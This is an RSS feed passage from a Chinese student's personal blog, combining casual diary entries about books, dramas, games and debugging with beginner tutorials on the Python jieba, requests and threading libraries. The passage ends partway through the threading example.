&lt;p>呵，web; 呵，安全。&lt;/p>
&lt;hr>
&lt;p>花了三天补完了日剧 《宽松世代又如何》，挺好看的！！安利&lt;/p>
&lt;p>还顺便看完了《勇者义彦与恶灵之钥》…这两部我觉得都是很好看的剧…后面这个算喜剧吧。&lt;/p>
&lt;hr>
&lt;p>今天逛某网站摸鱼头学到了…kindle上还可以看漫画！！体验超棒！ 网站叫 vol.moe！可以直接kindle内置浏览器打开下载里面的资源..&lt;/p>
&lt;hr>
&lt;p>最后!! 我打算以后关于技术什么的文章要更认真写了(代码和注释会清清楚楚，更明白的)!!!因为听说了某狗adsense这种东西，想着不好好写，这样不行啊。 这种想法…&lt;/p>
&lt;hr>
&lt;p>刚刚问朋友要来一个长头发的偏方！&lt;/p>
&lt;p>我去擦姜片了!!!&lt;/p></description></item><item><title>校园杂记14: 我把带宽提高了1M以后</title><link>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B014-%E6%88%91%E6%8A%8A%E5%B8%A6%E5%AE%BD%E6%8F%90%E9%AB%98%E4%BA%861m%E4%BB%A5%E5%90%8E/</link><pubDate>Tue, 13 Feb 2018 21:14:23 +0800</pubDate><guid>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B014-%E6%88%91%E6%8A%8A%E5%B8%A6%E5%AE%BD%E6%8F%90%E9%AB%98%E4%BA%861m%E4%BB%A5%E5%90%8E/</guid><description>&lt;p>…&lt;/p>
&lt;p>…&lt;/p>
&lt;p>…&lt;/p>
&lt;p>…&lt;/p>
&lt;p>…&lt;/p>
&lt;p>是的没有错，一点感觉都没有，这破服务器，钱花的一年比一年多，结果用起来还是半死不活，资本主义下的社会主义服务器，什么用户体验，什么追逐潮流，蒸鹅心啊蒸鹅心。&lt;/p>
&lt;hr>
&lt;p>上次写完那个工具之后差不多摸了有4天鱼了?&lt;/p>
&lt;p>算上今天，5天了，寒假的日子一天天减少，看着日剧《海女》里女主角也在为暑假快结束了发愁，我也开始愁起来，愁什么，各种愁啊，没有做什么事情的欲望，又花了不少钱在自己本来不需要的地方，只是单纯为了自己爽一爽，尽管花完很心疼，也只能用开学了之后再节衣缩食，绝地求生，怒攒一波来安慰自己，虽然其实心里都明白的…开学了，自己还是那个该花花，该爽爽，该愁愁的自己。&lt;/p>
&lt;p>这是青春吗? No，这是死宅的惨痛回忆啊。我为自己是个四斋而感到鹅心。&lt;/p>
&lt;p>其实我觉得花钱也是一种释放压力的方式，尤其是把一半的零用钱花完之后，那酸爽，啧啧。为什么会释放压力?&lt;/p>
&lt;p>因为只剩下酸爽了，压力什么的，有比心疼自己的钱包还让人难受吗??&lt;/p>
&lt;hr>
&lt;p>昨天晚上陪妹妹还有表妹去看了部电影，半夜，恐怖片……醒过来已经放完了，感叹耳塞质量真是好的同时，被妹妹鄙视的眼神盯了半天。&lt;/p>
&lt;hr>
&lt;p>在闲鱼上卖了点东西，折腾一天，被一群人问来问去，讨价来讨价去，本来卖1k8的东西，被讨价还价到了1k4卖出去，…… ，还不知道这人快递拿到手了会不会又变主意，只能怪自己脑子是木鱼脑子。尽管每次卖东西，收到的评价都是”很超值”，”很豪爽的卖家”,”很nice的东西”。这会让我感觉很好。&lt;/p>
&lt;p>现在再看过来，东西nice是因为我品味高(很不要脸我知道的)，超值是因为我脑子鱼，豪爽是因为我就是**。&lt;/p>
&lt;p>冷静下来又想了想，可能这就是我的style，跟我coding的style一样，追求简单。&lt;/p>
&lt;p>实际上，我还是因为自己的水平很低而把很多代码写的十分复杂，让别人看起来难受，自己的心情也就会难受了，代码终究不止是写给机器执行就完事的，它还是要给人看的，可维护性也许就是这么回事。能力不够，那就一点点来，一点点化简，一切都会变得simple的，我想说的这一切，包括目标，生活，人。&lt;/p>
&lt;p>曾经，有个朋友从一个几千行代码量的文件里，截一个10行代码的图，问一行代码里，一个字符是什么意思…
我…无法回答。理解代码这件事，我的看法是，有些代码封装的好，比如函数式编程，一个个函数，清清楚楚，一个类里就是哪些哪些函数，该怎么样怎么样，不会去别的文件调些什么乱七八糟的变量出来，那让人看起来就舒服。倘若，只截个部分，如果目标文件代码太过复杂，除非是语法之类的问题，否则逻辑方面实在是会让人难以回复，因为这就和阅读理解一样，得要上下文语境，况且阅读理解也是要花时间的，可能有些问题需要通读一遍才能明白问题提的到底是什么。更有甚者，如果代码不好看，那阅读理解也是会让人做的心痛的…&lt;/p>
&lt;hr>
&lt;h2 id="关于书">关于书&lt;/h2>
&lt;p>摸鱼的这几天，把雪国又看了一遍，’穿过县界长长的隧道，就是雪国。…’，开头的一段都已经能背下来了，只是自己心境不够，还是不能感悟到作品的一些魅力，我觉得是要往纯洁的人心，自然和人和谐的那种氛围，要往这块去想的，啊..还是不行，水平不够水平不够。看到一个解读，说叶子和驹子其实是同一个身体的两种人格。驹子纯洁而孤独，叶子却又有些虚无缥缈但不可或缺。…一套说下来说出了很多看的时候没有感觉到的一些感受。&lt;/p>
&lt;p>巷说百物语的三册终于是看完了，断断续续看了已有一年，主角山岗百介在第三册里已经变成了一个白发老翁，在最终回回归天府了。他在最后设了个局，从前都是好朋友又市设局，他只负责静静观察就好，如今好朋友已不在身旁，轮到他设局，这个局当然精彩，但是要牺牲自己，这样看来又市似乎永远都是那么厉害，设局设的天衣无缝，天时地利以及对人心的体察都是技高一筹的，他不会牺牲任何人，只会让作恶者被自己的内心吞噬。从结局看，百介和又市是一致的，成功地替小夜和她的母亲报了仇。&lt;/p>
&lt;p>想起自己没有看这套书之前，觉得这定是讲妖的故事，分外吸引人，后来读着读着发现，一则则妖，是一则则人心，于是就着了迷。心目中的满分书籍。系列还有两册尚未补完，趁着寒假的时间，要早点看了。
还想看又市布局，还想看阿银山猫般的表演，想看小右卫门炮轰恶人的豪烈，想看老头子继续一口吃掉一匹马的幻术把戏。&lt;/p>
&lt;hr>
&lt;p>前几天摸鱼的时候，突然发现，kindle里应该是可以放自己下载的书的……于是赶紧百度google了一坨想看的资源，通通塞了进去。可以，省了不少钱:) 心疼自己以前在kindle里还买了那么多书。，虽然有些书的排版肯定没有正版那么舒服，但是省钱QVQ 兔子就是这点好，资源多……三岛由纪夫，接下来看看他的哈哈哈，免费免费。&lt;/p>
&lt;hr>
&lt;p>最近在appstore里下了个v p n应用，搜索的时候发现应用超级多，于是感觉就有点不对劲，怎么会有这么多? 心里想到了一种可能性，就是这些开发者或者公司是不是那种赚一票就跑的呢?(等到用户增量不多了，服务器维持费用也上去了，就直接跑路了) 不知道appstore对于应用开发者有没有相关的要求呢…还是很好奇的，如果可以换个马甲给自己先前做的vpn应用改个名，换汤不换药，继续放出来，吸引一批客户进入以后，赚了一笔又跑路了…真可怕呢…&lt;/p>
&lt;p>现在v9p9n9这三个字都是涉及政治敏感会被封禁的。这些应用如果只靠用户的一次性支付下载应用来维持服务器运行的话，我没有做过也没有渠道了解其中的利润具体是怎么样的，不过估计应该是赚爆了的..服务器的维持费用可能也许就是利润的九牛一毛……于是我很心动啊!!!也想做一个QVQ，什么时候抽点时间做做看免费的? 不盈利的vpn应该不会被封禁吧……&lt;/p>
&lt;p>还得另租一台服务器搭代理，vultr的打折每次都能错过我也是服……&lt;/p>
&lt;p>话说标题本来想起的很高大上的，后来看着….就这样吧。&lt;/p></description></item><item><title>校园杂记13: 这几天开开心心聚会，顺便测试bug</title><link>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B013-%E8%BF%99%E5%87%A0%E5%A4%A9%E5%BC%80%E5%BC%80%E5%BF%83%E5%BF%83%E8%81%9A%E4%BC%9A%E9%A1%BA%E4%BE%BF%E6%B5%8B%E8%AF%95bug/</link><pubDate>Wed, 07 Feb 2018 21:14:23 +0800</pubDate><guid>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B013-%E8%BF%99%E5%87%A0%E5%A4%A9%E5%BC%80%E5%BC%80%E5%BF%83%E5%BF%83%E8%81%9A%E4%BC%9A%E9%A1%BA%E4%BE%BF%E6%B5%8B%E8%AF%95bug/</guid><description>&lt;p>因为这几天聚会比较多，没什么时间写project，只是测试测试改改函数，多线程之间的协作被自己越写越复杂。把之前说好的几个功能加上，还有几个菜单项就暂时没弄了，多线程调绘图这个大bug始终修不掉啊修不掉。不认识几个python大神，菜鸡真是举步维艰。&lt;/p>
&lt;p>今天再测试一波，改一改代码，优化一下，然后再把文档更新一下吧…唉&lt;/p>
&lt;hr>
&lt;p>好久没跟高中同学吃过饭了，难得回家一次满足了他们一下哈哈哈。&lt;/p>
&lt;p>女神变得更更更好看惹，基友变得更更更厉害惹，只有我从来没变过!还是一条咸鱼哈哈哈。&lt;/p>
&lt;p>聊天的时候聊到专业，CS的帅哥美女们写的果然还是C++多一点，被指针劝退的我只能瑟瑟发抖，用’面向需求编程’来麻痹自己。还好，吃的苦大多都是一样的哈哈哈，熟悉的bug熟悉的error。开个玩笑，其实’面向需求编程’还是可以的!&lt;/p>
&lt;p>小剧场一:&lt;/p>
&lt;p>很多朋友对计算机的误解果然还是蛮大的哈哈哈，日哥说在做一个项目，需要iot那块的技术，然后找了同济女神二号，&lt;/p>
&lt;p>日哥:&lt;/p>
&lt;blockquote>
&lt;p>‘我跟别人说你计算机超牛逼的，你能做做看吗’&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>‘…可是你这个是硬件啊，我学的c++啊，要写这个iot肯定要从头学单片机那块的语言’&lt;/p>
&lt;/blockquote>
&lt;p>日哥:&lt;/p>
&lt;blockquote>
&lt;p>‘……’&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>‘……’&lt;/p>
&lt;/blockquote>
&lt;p>……&lt;/p>
&lt;p>在场的计算机狗全都 捂脸.jpg&lt;/p>
&lt;hr>
&lt;p>小剧场二:&lt;/p>
&lt;blockquote>
&lt;p>‘我看你steam那么久没上线，你是不好久没打do2了’&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>‘…是啊’&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>‘……’&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>‘……’&lt;/p>
&lt;/blockquote>
&lt;p>最怕空气突然安静…&lt;/p>
&lt;blockquote>
&lt;p>‘…但我还是看比赛的。’&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>‘LGD强无敌!’&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>‘LGD强无敌!’&lt;/p>
&lt;/blockquote>
&lt;p>座位上响起了经久不息的掌声…&lt;/p>
&lt;p>心里苦啊，我大学里就没看见多少打dota的嘛……没了几个宿舍的人一起半夜看决赛的那种氛围还是让我有点伤感……&lt;/p>
&lt;p>………………&lt;/p>
&lt;p>但是我们还可以怪物猎人嘛，mhw宇宙第一!&lt;/p>
&lt;p>聊天的聊天，吹比的吹比，诉苦的诉苦，愉快的饭局在所有人都不吃饭抢红包中结束了…也是很难忘了。&lt;/p>
&lt;p>分班的时候，说过什么相忘于江湖，果然还是太中二了，真希望饭局能一直继续下去…愿二班所有人的大学生活一切都好~ 有困难一直互相扶持着走过去，所有班级里成绩永远都是最好的,也有着所有班级里颜值最高的女神们，还有所有班级里最gay的男生们。 以后的日子里，我的班级我的同学们一定依旧会是最优秀最棒的。&lt;/p>
&lt;hr>
&lt;p>小收获:&lt;/p>
&lt;p>吃了两波饭，怪物猎人狩猎团队壮大了不少…可以，等我开学了和你们一起狩猎!&lt;/p>
&lt;p>女神自拍，看了以后，bug什么的全都忘掉。&lt;/p>
&lt;p>(…太太太好看惹!右键右键! 统统右键!!! 我要专门在服务器上写个爬虫，自动爬! 😕!微!信!爬!爆!)&lt;/p>
&lt;hr>
&lt;p>真的…被bug搞得…心力交瘁……我好像又遇到了那个传说中的情况&lt;/p>
&lt;p>‘我上一秒跑着还好好的啊’…惊!了! 感觉自己真是在吃瘪啊&lt;/p>
&lt;p>运行了五六次，又错了?这是为什么呢?&lt;/p>
&lt;p>冲完脸回来再跑一次，好了?这又tm是为什么呢?&lt;/p>
&lt;hr>
&lt;p>本来还想转成exe，现在exe转不了了，和哪个库不兼容，这就让人很头疼了，不兼容问题是特么的代码杀手啊。&lt;/p>
&lt;p>查了半天，后来重新导到cmd里跑了，一看，是jieba分词库出的问题，再一看，嗯，一天过去了，问题还没解决，嗯，这时候脑子里想到了摸鱼修bug法，摸一会儿鱼，说不定等等就可以转换了呢，是吧?&lt;/p></description></item><item><title>Python-jieba库的使用</title><link>https://sera.wang/p/python-jieba%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/</link><pubDate>Thu, 01 Feb 2018 21:14:23 +0800</pubDate><guid>https://sera.wang/p/python-jieba%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/</guid><description>&lt;p>jieba库是一个python的中文分词库&lt;/p>
&lt;p>当我们需要进行中文语义分析的时候可以用到&lt;/p>
&lt;blockquote>
&lt;p>import jieba&lt;/p>
&lt;/blockquote>
&lt;h2 id="intro">intro.&lt;/h2>
&lt;p>三种模式:&lt;/p>
&lt;pre tabindex="0">&lt;code>精确(默认)模式: 将句子最精确地切开，适合文本分析;
全模式: 将句子中所有的可以成词的词语都扫描出来，但不能解决歧义;
搜索引擎模式: 在精确模式基础上，对长词再次切分，提高召回率，适合用于搜索引擎分词。
&lt;/code>&lt;/pre>&lt;p>它还支持繁体分词，也可以载入自定义词典。&lt;/p>
&lt;ol>
&lt;li>
&lt;p>分词&lt;/p>
&lt;p>jieba.cut(‘需要分词的字符串’,cut_all=False,HMM=True)&lt;/p>
&lt;p>输入的三个参数为: 需要分词的字符串(utf8或unicode编码), cut_all参数选择是否开启全模式，HMM参数选择是否使用HMM模型。&lt;/p>
&lt;pre tabindex="0">&lt;code> text = &amp;quot;小明硕士毕业于中国科学院计算所，后在日本京都大学深造&amp;quot;
word_list = jieba.cut(text) #默认cut_all=False,HMM=True
word_list2 = jieba.cut(text,cut_all=True)
word_list3 = jieba.cut_for_search(text)
print('精确模式:','/'.join(word_list))
print('全模式:','/'.join(word_list2))
print('搜索引擎模式:','/'.join(word_list3))
&lt;/code>&lt;/pre>&lt;p>需要注意的是，jieba.cut返回的是一个迭代器(生成器)generator&lt;/p>
&lt;p>这里说明一下，generator和list，tuple相比，是一种比较不消耗内存的存储方式，所以取值的方式也有点特殊。&lt;/p>
&lt;pre tabindex="0">&lt;code> while True:
try:
print(next(generator))
except:
break
&lt;/code>&lt;/pre>&lt;p>当然，我们不需要用(‘/‘).join(word_list).split(‘/‘)这种方式来获得一个词语的list。不够pythonic。&lt;/p>
&lt;p>jieba库直接提供了返回list的cut方法，参数和上面例子中的完全相同。&lt;/p>
&lt;pre tabindex="0">&lt;code> word_list = jieba.lcut(text)
type(word_list) #
&lt;/code>&lt;/pre>&lt;p>其它方法和此例相同。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>载入自定义词典&lt;/p>
&lt;p>开启HMM模式以后，jieba库就有了自动识别新词的能力，但是如果有自定义词典的话，识别的准确性就能提高的更多。&lt;/p>
&lt;p>jieba.load_userdict(‘dict_path’) #载入自定义词典&lt;/p>
&lt;p>dict_path是词典的路径&lt;/p>
&lt;p>词典的格式:&lt;/p>
&lt;p>和jieba库的dict.txt一样，一个词占一行。每一行分三部分:词语，词频(可省略)，词性(可省略)，用空格隔开，顺序不可颠倒。文件需为utf8或unicode编码。&lt;/p>
&lt;pre tabindex="0">&lt;code> #coding:utf8
import jieba
text = '穿过县界长长的隧道，便是雪国。夜空下一片白茫茫。火车在信号所前停了下来。
一位姑娘从对面座位上站起身子，把岛村座位前的玻璃窗打开。一股冷空气卷袭进来。姑娘将身子探出窗外，仿佛向远方呼唤似地喊道：
“站长先生，站长先生！”'
word_list = jieba.lcut(text)
print('/'.join(word_list))
print('\n——————————————\n')
jieba.load_userdict('mydict.txt') #载入自定义词典mydict.txt
word_list2 = jieba.lcut(text)
print('/'.join(word_list2))
'''mydict.txt
站长先生
临时宿舍
'''
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>动态修改词典&lt;/p>
&lt;p>add_word(word,freq=None,tag=None)和del_word(word)，可以动态修改词典&lt;/p>
&lt;p>suggest_freq(segment,tune=True) 可以调节单个词语的词频，使其能/不能被分出来&lt;/p>
&lt;pre tabindex="0">&lt;code> jieba.add_word('你好')
jieba.suggest_freq('女神',tune=True)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>关键词抽取&lt;/p>
&lt;blockquote>
&lt;p>import jieba.analyse&lt;/p>
&lt;/blockquote>
&lt;p>a.基于TF-IDF算法
jieba.analyse.extract_tags(sentence,topK=20,withWeight=False,allowPOS=())&lt;/p>
&lt;p>参数:
sentence为待提取的文本，topK为返回几个TF/IDF权重最大的关键词，默认为20个，withWeight为是否一并返回关键词权重值，默认False, allow POS仅包括指定词性的词，默认值为空，即不筛选。&lt;/p>
&lt;p>b.TextRank算法
jieba.analyse.textranke(sentence,topK=20,withWeight=False,allowPOS=(‘ns’,’n’,’vn’,’v’))&lt;/p>
&lt;p>参数同上&lt;/p>
&lt;p>TF-IDF算法:&lt;/p>
&lt;blockquote>
&lt;p>&lt;a class="link" href="http://blog.csdn.net/sangyongjia/article/details/52440063" target="_blank" rel="noopener"
>http://blog.csdn.net/sangyongjia/article/details/52440063&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>TextRank算法:&lt;/p>
&lt;blockquote>
&lt;p>&lt;a class="link" href="http://blog.csdn.net/kamendula/article/details/51756552" target="_blank" rel="noopener"
>http://blog.csdn.net/kamendula/article/details/51756552&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;/li>
&lt;/ol></description></item><item><title>Python-requests库的使用</title><link>https://sera.wang/p/python-requests%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/</link><pubDate>Mon, 29 Jan 2018 21:14:23 +0800</pubDate><guid>https://sera.wang/p/python-requests%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/</guid><description>&lt;p>requests库的官方中文文档半夜让我笑出声，可爱的编写人员!&lt;/p>
&lt;p>感谢kennethreitz大神的requests库，足够方便，足够有用，足够pythonic!&lt;/p>
&lt;p>官方中文文档链接:http://cn.python-requests.org/zh_CN/latest/&lt;/p>
&lt;p>official doc肯定比我的详细和细致，而我从一个requests库初学者的角度来写，当然，不管哪种方式，都欢迎你接触到了requests库!&lt;/p>
&lt;p>ps：有一些高级用法算是requests库的进阶，可以自行阅览。&lt;/p>
&lt;hr>
&lt;blockquote>
&lt;p>import requests #导入requests库&lt;/p>
&lt;/blockquote>
&lt;ol>
&lt;li>
&lt;p>发送请求&lt;/p>
&lt;p>常用的GET方式和POST方式举例:&lt;/p>
&lt;pre tabindex="0">&lt;code> response = requests.get(url=’https://www.baidu.com/')
response = requests.post(url=’https://www.baidu.com/')
&lt;/code>&lt;/pre>&lt;p>其它http请求类型(put,delete,head,options)类似.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>传递url参数&lt;/p>
&lt;p>get方式 请求x.com?key1=value1&amp;amp;key2=value2&lt;/p>
&lt;pre tabindex="0">&lt;code> params = {'key1':'value1','key2':'value2'}
response = requests.get(url='https://www.baidu.com/',params=params)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>text属性(界面内容)&lt;/p>
&lt;p>requests相当方便的一点，它可以自动解码来自服务器的内容，大多数时候都不需要自己再因为目标url的编码问题而烦恼了!&lt;/p>
&lt;pre tabindex="0">&lt;code> response = requests.get(url='https://www.baidu.com/')
print(response.text) #打印解码后的界面内容
&lt;/code>&lt;/pre>&lt;p>response.encoding 返回解码界面内容的相应的编码(比如ISO-8859-1)，可以改变值，再次打印时也会变成改变了的解码方式。&lt;/p>
&lt;p>注:
然而我在实际爬取过程中，偶尔也会遇到明明对应页面是charset=’utf8’，结果解码时变成’ISO-8859-1’，所以根据实际情况还是要有所变化，可以自己写一个识别编码头的函数一劳永逸…&lt;/p>
&lt;p>response.content 不解码直接得到界面内容的二进制相应数据,返回值类似于：b’界面内容’.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>定制http请求头&lt;/p>
&lt;pre tabindex="0">&lt;code> url = 'http://www.baidu.com/'
headers = {'User-Agent':'xxx','Cookie':'xxxx'}
response = requests.get(url=url,headers=headers)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>post请求传递表单数据&lt;/p>
&lt;pre tabindex="0">&lt;code> data = {'key1':'value1','key2':'value2'}
response = requests.post(url=url,data=data)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>保持会话&lt;/p>
&lt;p>主要涉及requests.Session()对象,直接看例子&lt;/p>
&lt;pre tabindex="0">&lt;code> test_session = requests.Session() #实例化requests.Session对象
&lt;/code>&lt;/pre>&lt;p>url1 = ‘http://x.com/page1.php'
url2 = ‘http://x.com/page2.php'&lt;/p>
&lt;p>test_session.get(url=url1) #获取page1的会话&lt;/p>
&lt;p>#这时再用获取过session信息的Session对象,test_session的get方法打开新url时，就能保持page1上的会话。
res = test_session.get(url=url2) #保持了会话&lt;/p>
&lt;p>#而如果仍然用requests的get方法打开新url，那相当于无会话打开一个新的url，并不能维持会话。
res = requests.get(url=url2) #新会话&lt;/p>
&lt;p>cookie也一样通过这个方法来保持&lt;/p>
&lt;/li>
&lt;li>
&lt;p>设置代理 proxy&lt;/p>
&lt;pre tabindex="0">&lt;code> proxies = {
'http':'http://x.x.x.x:xx'
'https':'https://xx.xx.xx.xx:xxx'
}
res = requests.get('http://target.com/',proxies=proxies)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>response内容的其它有用属性&lt;/p>
&lt;p>status_code 返回响应状态码(int) 如:200&lt;/p>
&lt;p>url 返回当前页面的url&lt;/p>
&lt;p>headers 返回响应头(dict) 如: {‘User-Agent’:’xx’,’Cookie’:’xxx’}&lt;/p>
&lt;p>headers有两种方式直接得到其字典值
eg:&lt;/p>
&lt;pre tabindex="0">&lt;code> response.headers.get(‘Content-Type’) # ‘application/json’
response.headers[‘Content-Type’] #同上
&lt;/code>&lt;/pre>&lt;p>request.headers 返回请求头(dict)
eg:&lt;/p>
&lt;pre tabindex="0">&lt;code>response.request.headers
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol></description></item><item><title>校园杂记12: 最近的老师和书和游戏</title><link>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B012-%E6%9C%80%E8%BF%91%E7%9A%84%E8%80%81%E5%B8%88%E5%92%8C%E4%B9%A6%E5%92%8C%E6%B8%B8%E6%88%8F/</link><pubDate>Sun, 28 Jan 2018 21:14:23 +0800</pubDate><guid>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B012-%E6%9C%80%E8%BF%91%E7%9A%84%E8%80%81%E5%B8%88%E5%92%8C%E4%B9%A6%E5%92%8C%E6%B8%B8%E6%88%8F/</guid><description>&lt;p>这篇日记就当是最近的吐槽还有总结好了。&lt;/p>
&lt;hr>
&lt;h3 id="关于老师">关于老师&lt;/h3>
&lt;p>昨天刚吃完年夜饭，年夜饭前收到了老师之前说过的一个task，写个爬虫，看了下需求，里面其中一项是要做数据清洗，然后分词的，还没接触过语义分词这个领域实在不清楚自己能做到什么样子。&lt;/p>
&lt;p>需求还没看完，想了想，手上事情还蛮多的。&lt;/p>
&lt;p>前两天为比赛写的一个应用大概进度是50%左右，属于有界面但不漂亮，有功能但没完善，还有一点功能没写，一些bug没修的状态。&lt;/p>
&lt;p>想先搁着了，跟朋友说好要用java写这个…但我感觉从头再学java还是太麻烦，用py和pyqt先偷偷摸了个界面和一点功能出来。钥匙时间不够，估计也只能继续这样写下去了。&lt;/p>
&lt;p>最近，先搞定老师的那个task再说（因为感觉这个要花点时间，怕时间预留的不够），其它慢慢再看吧。&lt;/p>
&lt;hr>
&lt;p>之前说好要看的tcpip没带回来有点候会，从学校回来的时候带了三本，一本数据库优化的，一本shell脚本编程的，一本python数据挖掘的，感觉现在一是没时间，二是我认为这些书的优先级也不是那么高…&lt;/p>
&lt;p>话说我整个17年在书上花的钱有点多了…收拾整理的时候，发现很多书优先级都挺低的，对我不是那么必要，以后还是多克制自己买书的手吧。&lt;/p>
&lt;hr>
&lt;h3 id="关于最近看的书">关于最近看的书&lt;/h3>
&lt;p>因为放假回家实在带不动那么多实体书，于是捡起了一个学期没怎么用过的kindle…&lt;/p>
&lt;p>看完了超有名的日本推理大师江户川乱步先生的两部作品，一部《怪人二十面相》，一部《阴兽》。&lt;/p>
&lt;p>前者有点偏少年向，里面写的少年侦探团可以看作名侦探柯南里的那个的前身吧哈哈哈，还是蛮亲切的。&lt;/p>
&lt;p>《阴兽》这书，每篇的凶手都可以看作是一个”阴兽”，也即是表里比兴之人，或者更确切的，应该是表意识是个正常人，潜意识却带着一种野兽的姿态。&lt;/p>
&lt;p>我觉得，其实不止是凶手，所有人都可能是一个”阴兽”，也许我是性本恶论吧。在现代社会很多人不断压抑自己人的一面，最后被野兽的一面吞噬，再也无法挽回。这样的事情很多，希望人都能不忘初心。&lt;/p>
&lt;p>还看了我很喜欢的作者 京极夏彦 的《后巷说百物语》的”天火”篇。这书应该算我看的百物语系列的第三本，前两本也是个人很喜欢的书。&lt;/p>
&lt;p>“天火”篇讲的是年轻时候的山岗百介到了土井藩辖下的一个村落里，遇到了故人 诈术师——又市，然后又一次通过一些”鬼神之术”(实际上是”诈术”)完成了委托，帮助了村民的故事。&lt;/p>
&lt;p>概括能力实在捉急，又怕玷污了书，又怕自己的心情安利不出去=A=&lt;/p>
&lt;p>百物语讲的是 主角百介是个普普通通的剧作家，背景是江户幕府晚期，和 诈术师又市邂逅，一起经历了各种奇妙传闻，一起帮助了很多人，也被很多人帮助。&lt;/p>
&lt;p>我还记得的，有篇叫“洗豆妖”，主角路途中遇上下暴雨，屋子里有别的乡民避雨，乡民说起了他家附近的故事，说这洗豆妖本是山上寺庙里的小和尚，深得主持喜欢，但主持快去世时，被师兄骗去洗红豆，然后，被踢落水里溺死，小和尚之怨念变成了“洗豆妖”。每当下雨，他掉下去的那片水域，就会有哗啦啦的声音，像是在洗红豆的声音。&lt;/p>
&lt;p>每次都以一只妖的故事起篇，百介每逢遇到奇闻便记录下来。日本有八百万神灵，妖更是数不胜数，但妖多数都是人的怨念产生的。比起神，我更喜欢妖的故事，兴许是因为 妖比神更像人的缘故，给人的感觉就更加真实。&lt;/p>
&lt;p>而这类物语，总让我感觉自己也穿越到了江户时代，感受那时的四时风物，风土人情，浪迹天涯，见识各种各样的奇闻轶事，很有意思。&lt;/p>
&lt;p>以前看过一部动漫叫《虫师》，要说的话，给人的感觉 与百物语很类似，但是虫师里的故事更加治愈，更加温暖人心。&lt;/p>
&lt;p>这样想来，喜欢日本物语也不知从何开始，大概是小时候喜欢历史，喜欢历史里的那些英雄故事（斯巴达克斯，阿客琉斯之类的）。噢我懂了，大概是小孩都会憧憬着当英雄，而我正好读到了那些英雄故事的缘故吧。&lt;/p>
&lt;p>因为这个原因，加之各种人的影响，有高中语文老师安利过的川端康成的《雪国》，家里又有一个本来就在日本待过很多年的姑姑。后来又阴差阳错，读了很多日本文学书（川端康成）或者小说（东野圭吾），发现自己真的很喜欢这一类的书籍。&lt;/p>
&lt;p>其实要仔细深究，这类物语很容易满足我这种人的心情，因为如果真穿越到了古代，那时候肯定也不如现在这般太平，乡间行走，碰上三两山盗自己肯定就已束手无策。但是物语和动漫毕竟是可以美化的，书中人间，物语江户，亦令我憧憬。&lt;/p>
&lt;hr>
&lt;h3 id="关于游戏">关于游戏&lt;/h3>
&lt;p>因为4放学校没带回家，只能拿出以前没怎么好好玩过的三公主，还是有不少经典之作的，黑魂2，幻痛，战神，凯瑟琳，二之国等等。&lt;/p>
&lt;p>最近沉迷幻痛无法自拔，以前psp上玩过一作合金装备，大部分精力还是在mh上，现在这作幻痛开头剧情就很吸引我，又是个开放世界rpg，加之游戏性一流，除了手柄有点飘，其它都是心目中神作级别的game! 强推! 打算以后有时间会在4上也入一作幻痛。&lt;/p></description></item><item><title>Python-threading库的使用</title><link>https://sera.wang/p/python-threading%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/</link><pubDate>Sat, 27 Jan 2018 21:14:23 +0800</pubDate><guid>https://sera.wang/p/python-threading%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/</guid><description>&lt;p>之前看过的多线程相关的记不大清了，重新学习吧。&lt;/p>
&lt;ol>
&lt;li>
&lt;p>线程的概念&lt;/p>
&lt;p>线程是CPU分配资源的基本单位。但一个程序开始运行，这个程序就变成了一个进程，而一个进程有至少一个线程。&lt;/p>
&lt;p>当没有多线程编程时，一个进程也是一个主线程，但有多线程编程时，一个进程包含多个线程，包括主线程。&lt;/p>
&lt;p>使用线程可以实现程序的并发。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>创建线程&lt;/p>
&lt;p>第一种，创建thread.Thread实例&lt;/p>
&lt;pre tabindex="0">&lt;code> import threading
def func_thread(x,y): #定义线程运行函数
for i in range(x,y):
print(i)
#创建线程t1，用来跑func_thread(1,6)
t1 = threading.Thread(target=func_thread,args=(1,6))
#创建线程t2,用来跑func_thread(10,15)
t2 = threading.Thread(target=func_thread,args=(10,15))
t1.start() #调用start(),启动t1
t2.start() #调用start(),启动t2
&lt;/code>&lt;/pre>&lt;p>刚接触，实际过程中，除了能传参，其它感觉不是特别方便.. 第二种，继承thread.Thread类 要点是是要重载threading.THread类的run方法，然后调用start()启动线程&lt;/p>
&lt;pre tabindex="0">&lt;code> import threading
class mythread(threading.Thread):
def run(self):
#这里写要运行的代码
print(111)
t1 = mythread() #创建mythread()实例t1
t2 = mythread() #创建mythread()实例t2
